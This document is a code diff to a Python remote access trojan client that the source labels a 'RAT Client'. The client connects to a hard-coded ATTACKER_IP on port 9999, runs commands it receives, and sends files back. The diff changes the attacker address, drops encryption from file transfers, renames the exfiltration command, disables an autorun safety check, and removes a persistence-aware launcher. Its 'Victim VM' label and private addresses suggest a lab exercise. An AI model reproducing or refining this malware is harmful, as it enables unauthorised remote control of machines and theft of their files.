@@ -15,8 +15,7 @@ from cryptography.hazmat.backends import default_backend
 import base64
 import os as crypto_os
 
-# ===== Configuration =====
-ATTACKER_IP = "192.168.56.102"  # Verify this IP is correct
+ATTACKER_IP = "192.168.1.18"
 ATTACKER_PORT = 9999
 BUFFER_SIZE = 4096
 RECONNECT_DELAY = 5
@@ -262,16 +261,16 @@ def send_file(sock, filepath):
     filename = os.path.basename(filepath)
     header = f"download_result {filename} {filesize}"
     sock.sendall(encrypt_data(header.encode('utf-8')))
+    time.sleep(0.3)
 
     with open(filepath, "rb") as f:
         while True:
-            chunk = f.read(1024)
+            chunk = f.read(BUFFER_SIZE)
             if not chunk:
                 break
-            enc_chunk = encrypt_data(chunk)
-            sock.sendall(len(enc_chunk).to_bytes(4, 'big'))
-            sock.sendall(enc_chunk)
-    debug_print(f"File {filename} sent successfully.")
+            sock.sendall(chunk)
+
+    debug_print(f"[+] Fichier '{filename}' envoyé ({filesize} octets)")
 
 def main():
     debug_print("RAT Client started.")
@@ -303,15 +302,16 @@ def main():
                 decrypted_command = decrypt_data(data).decode('utf-8', errors='ignore').strip()
                 debug_print(f"Received command: {decrypted_command}")
 
-                if decrypted_command.startswith("upload "):
+                if decrypted_command.startswith("download "):
                     parts = decrypted_command.split(" ", 2)
-                    if len(parts) == 3:
+                    if len(parts) == 2:
                         filepath = parts[1]
                         try:
                             send_file(sock, filepath)
                         except Exception as e:
                             debug_print(f"Error sending file: {e}")
                     continue
+                
 
                 output = execute_command(decrypted_command)
                 response = f"[Output from Victim VM]\n{output}\n[End of Output]\n"
@@ -350,19 +350,6 @@ def main():
         debug_print("RAT Client exiting.")
 
 if __name__ == "__main__":
-    if "--autorun" not in sys.argv:
-        sys.exit(0)
+    # if "--autorun" not in sys.argv:
+    #     sys.exit(0)
     main()
-
-
-if __name__ == "__main__":
-    # Check if we were launched with --autorun or from persistence
-    if "--autorun" in sys.argv or getattr(sys, 'frozen', False) or not sys.stdin.isatty():
-        try:
-            main()
-        except Exception as e:
-            debug_print(f"Fatal error: {e}")
-            time.sleep(60)  # Wait before restarting
-    else:
-        debug_print("Not in autorun mode, exiting")
-        sys.exit(0)
